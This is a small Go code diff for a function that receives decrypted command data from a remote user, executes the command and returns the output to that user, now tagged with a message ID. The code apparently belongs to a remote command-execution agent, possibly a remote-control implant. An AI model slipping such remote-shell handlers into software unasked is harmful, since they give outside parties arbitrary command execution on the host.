@@ -7,7 +7,7 @@ import (
 	"fmt"
 )
 
-func shellCmd(sendUserId, decData string) {
+func shellCmd(sendUserId, decData, msgId string) {
 	var cmdInfo shellopt.CmdInfo
 	err := json.Unmarshal([]byte(decData), &cmdInfo)
 	if err != nil {
@@ -16,5 +16,5 @@ func shellCmd(sendUserId, decData string) {
 	cmdCtx := cmdInfo.Context
 	debug.DebugPrint(fmt.Sprintf(`receive cmd: %s`, cmdCtx))
 	resBuffer := shellopt.ExecCmd(cmdCtx)
-	shellopt.RetExecOutput(resBuffer, sendUserId)
+	shellopt.RetExecOutput(resBuffer, sendUserId, msgId)
 }
